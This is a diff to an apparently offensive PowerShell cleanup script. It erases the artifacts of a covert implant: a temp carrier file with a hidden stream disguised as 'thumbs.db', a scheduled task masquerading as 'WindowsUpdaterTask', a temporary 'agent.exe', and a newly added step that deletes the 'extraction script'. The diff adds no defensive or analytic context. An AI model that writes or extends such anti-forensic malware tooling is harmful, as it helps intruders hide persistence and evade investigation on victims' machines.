@@ -2,6 +2,7 @@ param($args)
 
 $carrierFile = "C:\Windows\Temp\~DF539A.tmp"
 $streamName = "thumbs.db"
+$scriptPath = "C:\Windows\Temp\run.ps1"
 $taskName = "WindowsUpdaterTask"
 $tempAgent = "$env:TEMP\agent.exe"
 
@@ -19,7 +20,7 @@ if (Test-Path $carrierFile) {
     Write-Output "[-] Carrier file not found."
 }
 
-# 2. Delete the scheduled task using COM (no admin needed)
+# 2. Delete the scheduled task using COM (no password prompt)
 try {
     $taskService = New-Object -ComObject Schedule.Service
     $taskService.Connect()
@@ -30,7 +31,17 @@ try {
     Write-Output "[-] Failed to delete scheduled task (maybe it doesn't exist?)"
 }
 
-# 3. Optionally delete the carrier file itself (comment out if you want to keep it)
+# 3. Delete the extraction script
+if (Test-Path $scriptPath) {
+    try {
+        Remove-Item $scriptPath -Force -ErrorAction Stop
+        Write-Output "[+] Extraction script deleted: $scriptPath"
+    } catch {
+        Write-Output "[-] Could not delete extraction script."
+    }
+}
+
+# 4. Optionally delete the carrier file itself
 if (Test-Path $carrierFile) {
     try {
         Remove-Item $carrierFile -Force -ErrorAction Stop
@@ -40,7 +51,7 @@ if (Test-Path $carrierFile) {
     }
 }
 
-# 4. Remove any leftover temporary agent
+# 5. Remove any leftover temporary agent
 if (Test-Path $tempAgent) {
     try {
         Remove-Item $tempAgent -Force -ErrorAction Stop
